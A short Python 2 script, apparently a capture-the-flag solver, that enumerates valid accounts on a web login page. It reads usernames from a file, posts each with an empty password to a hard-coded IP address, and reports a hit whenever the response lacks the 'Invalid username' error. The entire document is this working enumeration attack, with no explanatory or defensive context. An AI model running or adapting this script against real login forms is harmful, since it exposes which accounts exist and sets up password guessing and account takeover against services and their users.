import requests

with open("usernames.txt", 'r') as h:
	usernames_list = h.read().splitlines()


url = "http://34.74.105.127/b00daed8de/login"

for user in usernames_list:
	req = requests.post(url, {"username": user, "password":""})
	if "Invalid username" not in req.text:
		print "Found user: " + user
		break